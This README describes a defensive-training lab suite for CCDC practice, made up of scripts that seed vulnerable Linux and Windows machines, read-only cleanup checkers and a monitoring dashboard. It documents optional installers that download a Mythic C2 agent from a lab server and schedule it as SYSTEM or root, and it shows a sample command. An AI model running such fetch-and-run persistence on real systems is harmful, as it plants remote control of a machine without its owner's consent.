# Redhavi CCDC Lab Suite

Redhavi is a collection of intentionally vulnerable CCDC practice scenarios, read-only cleanup checkers, and monitoring utilities for Linux and Windows.

> [!WARNING]
> These files are for authorized training and testing only. The scenario scripts deliberately create weak accounts, persistence, insecure services, SSH access, and vulnerable web content. Run them only on isolated, disposable virtual machines with a recoverable snapshot.

## Contents

| File | Purpose |
| --- | --- |
| `redhavi` | Seeds and verifies the Ubuntu scenario. |
| `redhavi-check` | Performs the read-only Linux cleanup assessment. |
| `redhavi-check-shc` | Provides the Linux checker source adapted for SHC compilation. |
| `redhavi-fedora` | Seeds the Fedora scenario and periodic dashboard canary. |
| `redhavi-check-fedora` | Performs the read-only Fedora cleanup assessment. |
| `redhavi-check-federo-shc` | Provides the Fedora checker source adapted for SHC compilation. The filename retains its historical spelling. |
| `redhaviwin.ps1` | Seeds and verifies the Windows scenario. |
| `redhavi-checkWin.ps1` | Scores cleanup of the Windows scenario without modifying it. |
| `redhavi-checkWin-ps2exe.ps1` | Packages the Windows checker as an elevated x64 executable. |
| `redhavi-apolloWin.ps1` | Downloads an optional Apollo agent and creates its recurring Windows task. |
| `redhavi-poseidon` | Downloads an optional Poseidon agent and creates its recurring Linux systemd timer. |
| `apollo1.exe` | Zero-byte placeholder created with `touch`; it is not a functional Apollo payload. |
| `poseidon.bin` | Zero-byte placeholder created with `touch`; it is not a functional Poseidon payload. |
| `redhavi-monitor` | Runs the canary check-in server and live status dashboard. |
| `redhavi-task.md` | Gives students a cleanup assignment without disclosing answers. |
| `ecomredhavi` | Creates an inert e-commerce web and database hardening lab. |
| `ecomredhavimysql` | Creates the extended Apache and MySQL misconfiguration lab. |
| `INSTALLATION.md` | Documents checker builds, deployment, monitoring, and exercise operation. |

## Scenario Workflow

1. Create an isolated disposable VM and take a snapshot.
2. Run the matching scenario preparation script as the instructor.
3. Give students `redhavi-task.md` and the appropriate checker or compiled checker.
4. Run `redhavi-monitor` on a separate instructor system when using canary check-ins.
5. Restore the snapshot after the exercise instead of trusting manual cleanup as the only recovery method.

Scenario scripts change the target. Checker scripts are read-only, but they require privileged access to inspect all scored artifacts.

## Optional Apollo Exercise

`redhavi-apolloWin.ps1` downloads `apollo1.exe` from the external server IP configured by `-DownloadUrl` and schedules it to run as `SYSTEM`. The default URL is `http://172.16.101.77:8087/apollo1.exe`.

The included `apollo1.exe` and `poseidon.bin` files were created with `touch` and contain no payload data. They are placeholders only and cannot execute or connect anywhere.

An Apollo payload is not a permanent reusable binary. Generate a new payload with Mythic for the current authorized exercise, place it on the external lab server, and update `-DownloadUrl`. Use `-ExpectedSha256` to pin and verify the newly generated file before installation. A stale payload may no longer connect or function with the active Mythic environment.

Never expose the payload server or Mythic infrastructure to an untrusted network. The optional Apollo artifact is not included in the current Windows cleanup score.

## Optional Poseidon Exercise

`redhavi-poseidon` provides the Linux counterpart to `redhavi-apolloWin.ps1`. It downloads a newly generated `poseidon.bin` from the external server configured by `--download-url`, installs it under `/var/lib/redhavi`, and creates a systemd timer that attempts to run it as root every three minutes. An already running service is not started again.

The default URL is `http://172.16.102.58:8087/poseidon.bin`. Generate a fresh Poseidon payload in Mythic for the current authorized exercise, host it on the isolated external lab server, and pin it with `--expected-sha256` whenever possible.

```bash
sudo ./redhavi-poseidon \
  --download-url http://172.16.102.58:8087/poseidon.bin \
  --expected-sha256 REPLACE_WITH_64_HEX_CHARACTERS

sudo ./redhavi-poseidon --remove
```

The repository's zero-byte `poseidon.bin` remains a placeholder and is never used automatically by the installer. This optional artifact is not included in the current Linux cleanup score.

## Documentation

See [INSTALLATION.md](INSTALLATION.md) for build and deployment instructions. See [redhavi-task.md](redhavi-task.md) for the student-facing assignment.
